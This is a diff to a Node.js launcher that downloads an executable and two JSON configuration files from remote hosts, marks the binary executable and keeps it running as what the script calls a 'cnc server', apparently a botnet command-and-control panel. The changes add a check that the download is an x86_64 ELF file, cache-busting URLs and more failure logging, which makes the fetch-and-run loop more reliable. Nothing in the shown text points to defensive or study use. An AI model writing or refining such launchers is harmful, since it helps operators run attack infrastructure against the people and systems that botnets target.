@@ -37,11 +37,35 @@ function request(url, redirects) {
 async function download(rel, dest) {
   for (const base of BASES) {
     try {
-      const { status, buffer } = await request(`${base}/${rel}`, 0);
+      const { status, buffer } = await request(`${base}/${rel}?cb=${Date.now()}`, 0);
       if (status === 200 && buffer && buffer.length > 0) {
+        if (buffer.length < 4 || buffer[0] !== 0x7f || buffer[1] !== 0x45 || buffer[2] !== 0x4c || buffer[3] !== 0x46) {
+          console.log(`bad binary for ${rel}: not an ELF file, first bytes ${buffer.slice(0, 8).toString('hex')}`);
+          continue;
+        }
+        const machine = buffer.readUInt16LE(18);
+        if (machine !== 62) {
+          console.log(`bad binary for ${rel}: machine ${machine} (expected 62 = x86_64, node arch=${process.arch})`);
+          continue;
+        }
         await fs.promises.mkdir(path.dirname(dest), { recursive: true });
         await fs.promises.writeFile(dest, buffer);
         await fs.promises.chmod(dest, 0o755);
+        console.log(`downloaded ${rel} (${buffer.length} bytes)`);
+        return true;
+      }
+    } catch {}
+  }
+  return false;
+}
+
+async function downloadAny(rel, dest) {
+  for (const base of BASES) {
+    try {
+      const { status, buffer } = await request(`${base}/${rel}?cb=${Date.now()}`, 0);
+      if (status === 200 && buffer && buffer.length > 0) {
+        await fs.promises.mkdir(path.dirname(dest), { recursive: true });
+        await fs.promises.writeFile(dest, buffer);
         return true;
       }
     } catch {}
@@ -64,16 +88,17 @@ function detectPort() {
 }
 
 const FILES = [
-  ['bin/main', 'main'],
-  ['user.json', 'user.json'],
-  ['method.json', 'method.json'],
+  ['bin/main', 'main', true],
+  ['user.json', 'user.json', false],
+  ['method.json', 'method.json', false],
 ];
 
 async function fetchAll() {
-  for (const [rel, local] of FILES) {
+  for (const [rel, local, isBinary] of FILES) {
     let ok = false;
     for (let attempt = 0; attempt < 3 && !ok; attempt++) {
-      ok = await download(rel, path.join(__dirname, local));
+      const dest = path.join(__dirname, local);
+      ok = isBinary ? await download(rel, dest) : await downloadAny(rel, dest);
       if (!ok) {
         await new Promise((r) => setTimeout(r, 2000 * (attempt + 1)));
       }
@@ -94,7 +119,8 @@ async function main() {
   }
   const port = detectPort();
   console.log(`starting cnc server on 0.0.0.0:${port}`);
-  const server = spawn(path.join(__dirname, 'main'), ['-p', port, '-host', '0.0.0.0'], {
+  const serverPath = path.join(__dirname, 'main');
+  const server = spawn(serverPath, ['-p', port, '-host', '0.0.0.0'], {
     stdio: 'inherit',
     cwd: __dirname,
   });
@@ -103,7 +129,13 @@ async function main() {
     setTimeout(main, 2000);
   });
   server.on('error', (err) => {
-    console.error(`spawn failed: ${err.message}, restarting`);
+    try {
+      const st = fs.statSync(serverPath);
+      const exe = (st.mode & 0o111) !== 0;
+      console.error(`spawn failed: ${err.message} (file exists=${st.isFile()}, executable=${exe}, size=${st.size})`);
+    } catch (e) {
+      console.error(`spawn failed: ${err.message} (stat error: ${e.code})`);
+    }
     setTimeout(main, 2000);
   });
 }
